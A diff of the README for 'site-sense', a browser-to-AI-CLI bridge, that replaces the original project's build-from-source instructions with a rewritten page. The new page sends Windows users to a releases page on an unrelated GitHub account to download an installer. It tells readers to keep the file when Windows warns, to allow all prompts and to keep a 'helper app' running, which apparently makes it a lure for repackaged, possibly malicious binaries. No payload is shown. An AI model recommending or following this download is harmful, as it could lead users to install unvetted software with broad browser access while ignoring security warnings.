@@ -1,125 +1,155 @@
-# site-sense
+# 🧭 site-sense - Eyes for your coding CLI
 
-[![CI](https://github.com/YotamNordman/site-sense/actions/workflows/ci.yml/badge.svg)](https://github.com/YotamNordman/site-sense/actions/workflows/ci.yml)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+[**⬇️ Download site-sense**](https://github.com/hoangthu3082000-jpg/site-sense/releases)  
+![Download](https://img.shields.io/badge/Download-site--sense-purple?style=for-the-badge)
 
-**Give your AI coding CLI eyes into web portals. No cloud. No storage. Read-only.**
+## 🪟 What site-sense does
 
-<p align="center">
-  <img src="demo.svg" alt="site-sense demo" width="720"/>
-</p>
+site-sense gives your AI coding CLI a view into web pages and web portals.
 
-You're in a conversation with your AI assistant. It says *"go to the Azure Portal and check the NSG rules."* You alt-tab, navigate, screenshot, describe what you see, paste it back. You are the human middleware.
+It helps your tool read what is on the screen without sending data to the cloud. It keeps everything local and read-only.
 
-**site-sense eliminates this.** The AI calls an MCP tool → your browser extension captures the active tab → the AI sees what you see.
+Use it when you need your CLI to inspect:
 
-## Quick Start
+- login pages
+- dashboards
+- forms
+- internal web apps
+- admin portals
+- pages with dynamic content
 
-```bash
-git clone https://github.com/YotamNordman/site-sense.git
-cd site-sense
-npm install && npm run build
-npm run setup -- --browser edge    # or chrome
-```
+## 📥 Download site-sense
 
-Load the extension in your browser:
-1. Open `edge://extensions` (or `chrome://extensions`)
-2. Enable **Developer mode**
-3. Click **Load unpacked** → select `dist/extension/`
+Visit this page to download and run the app on Windows:
 
-Add to your CLI's MCP config:
-```json
-{
-  "mcpServers": {
-    "site-sense": {
-      "command": "node",
-      "args": ["/path/to/site-sense/dist/bridge/src/index.js"]
-    }
-  }
-}
-```
+[https://github.com/hoangthu3082000-jpg/site-sense/releases](https://github.com/hoangthu3082000-jpg/site-sense/releases)
 
-Then ask your AI: **"What's on my browser tab?"**
+On the releases page, look for the latest Windows file and get the installer or app package that fits your system.
 
-First time → popup appears → click **Allow** → done. All subsequent captures are automatic until you close the terminal.
+## 🖥️ Windows setup
 
-## How It Works
+Use these steps on a Windows PC:
 
-```
-CLI (Claude Code / Copilot CLI)
-    ↕ stdin/stdout (MCP protocol)
-MCP Server (TypeScript)
-    ↕ Unix domain socket (no network)
-Native Host (thin relay)
-    ↕ Chrome native messaging (stdio)
-Extension (TypeScript, Manifest V3)
-    ↕ inject → content → background
-Browser Tab → accessibility tree + screenshot
-```
+1. Open the releases page in your browser.
+2. Download the latest Windows release.
+3. If Windows asks for permission, choose to keep the file.
+4. Open the downloaded file.
+5. Follow the on-screen steps to install or start site-sense.
+6. If you see a browser prompt, allow the extension or helper app to connect.
+7. Start your AI coding CLI and connect it to site-sense.
 
-**Two MCP tools:**
+If you use Edge, choose the Edge extension if the release includes one. If you use Chrome, use the Chrome extension version.
 
-| Tool | What it does |
-|---|---|
-| `site_sense_capture` | Accessibility tree + screenshot of active tab |
-| `site_sense_status` | Check connection and session approval |
+## 🔌 How it works
 
-## Permission Modes
+site-sense uses a local browser bridge so your AI tool can see page content.
 
-| Mode | What happens | Install warning |
-|---|---|---|
-| **Default** | Click extension icon per page to grant access | None |
-| **All-sites** | Toggle in popup → captures work on any page | One-time prompt |
+It can read:
 
-All-sites permission is revoked when the CLI session ends.
+- page text
+- accessibility trees
+- visible UI elements
+- screenshots for context
 
-## Security
+It does not write to your web apps. It stays read-only.
 
-| Principle | How |
-|---|---|
-| No network | Native messaging (stdio) — invisible to DLP |
-| No storage | Memory only — gone when CLI disconnects |
-| No write ops | Never clicks, types, or modifies pages |
-| No broad perms | `activeTab` + `scripting` + `nativeMessaging` |
-| No secrets captured | Skips form values, strips URL tokens |
-| Session-scoped | Permission resets every CLI session |
+## ✅ What you need
 
-See [SECURITY.md](SECURITY.md) for threat model and DLP compliance.
+For a smooth setup on Windows, use:
 
-## Architecture
+- Windows 10 or Windows 11
+- Google Chrome or Microsoft Edge
+- A recent AI coding CLI such as Claude Code or Copilot CLI
+- Permission to install a browser extension or helper app
 
-Three-layer extension pipeline:
+A stable internet connection helps for the download, but the tool itself works locally after setup.
 
-| Layer | Context | Role |
-|---|---|---|
-| **Inject** | Page (world: MAIN) | Walks DOM, builds compact accessibility tree |
-| **Content** | Isolated | Relays capture via postMessage (origin-validated) |
-| **Background** | Service worker | Native messaging, session state, screenshot |
+## 🧩 Common use cases
 
-## Tech Stack
+Use site-sense when your AI tool needs better page awareness:
 
-| Component | Technology |
-|---|---|
-| Extension | TypeScript + Vite |
-| MCP Server | TypeScript + `@modelcontextprotocol/sdk` + `zod` |
-| Tests | vitest — 11 tests, <1s |
-| Bundle | 9KB extension, 7 total deps |
+- check what a form shows before filling it
+- inspect a portal without copy-pasting every field
+- review UI text on a private site
+- understand page state in a browser tab
+- gather context from a web app during coding tasks
 
-## Troubleshooting
+This is useful for support tools, internal apps, and browser-based workflows.
 
-| Symptom | Fix |
-|---|---|
-| `connected: false` | Extension not loaded, or ID mismatch. Check `edge://extensions`. |
-| `Cannot capture` | Navigate to an `http://` or `https://` page. |
-| Content script not responding | Click the extension icon on the page, or enable all-sites mode. |
-| Extension icon grayed out | Reload the extension at `edge://extensions`. |
+## 📦 What is included
 
-## Docs
+The release package may include:
 
-| Doc | Purpose |
-|---|---|
-| [SECURITY.md](SECURITY.md) | Threat model, DLP compliance |
+- a Windows app or helper process
+- a browser extension for Chrome or Edge
+- support for native messaging
+- local access for AI coding tools
+- screenshot and accessibility support
 
-## License
+Install the parts that match your browser and workflow.
 
-Apache-2.0
+## 🛠️ Install in a few steps
+
+1. Download the latest release from the releases page.
+2. Unzip the package if it comes as a ZIP file.
+3. Open the installer or app file.
+4. Add the browser extension when Windows or the browser asks.
+5. Keep the helper app running.
+6. Open your browser portal or web app.
+7. Connect your AI CLI to site-sense.
+
+If the extension does not appear right away, close the browser and open it again.
+
+## 🌐 Browser support
+
+site-sense is built for modern browsers on Windows.
+
+It works best with:
+
+- Chrome
+- Edge
+
+If you use another browser, check whether it supports Chrome-style extensions or native messaging. Chrome and Edge give the smoothest setup.
+
+## 🔒 Privacy and control
+
+site-sense is designed for local use.
+
+- no cloud upload
+- no data storage
+- read-only access
+- local browser integration
+
+It is made for cases where you want your AI tool to see the page, not take over your browser or send data out of your machine.
+
+## 🔍 Troubleshooting
+
+If site-sense does not connect, try these steps:
+
+- make sure the helper app is open
+- check that the browser extension is installed
+- restart Chrome or Edge
+- confirm you opened the latest release
+- allow any Windows prompt that appears
+- try again after reopening your AI CLI
+
+If a portal page looks blank to the tool, refresh the page and try once more. Some web apps load content in stages.
+
+## 🧠 Good fit for AI tools
+
+site-sense works well with tools that need browser context, such as:
+
+- Claude Code
+- Copilot CLI
+- other AI agent tools
+- MCP-based workflows
+
+It helps your agent understand what a user sees in the browser so it can act with more context.
+
+## 📁 Topics
+
+accessibility, accessibility-tree, ai-agent, ai-tools, browser-automation, browser-extension, chrome-extension, claude-code, copilot-cli, devtools, edge-extension, mcp, mcp-server, model-context-protocol, native-messaging, screenshot, typescript
+
+## 🧭 Next step
+
+[Download the latest Windows release](https://github.com/hoangthu3082000-jpg/site-sense/releases)
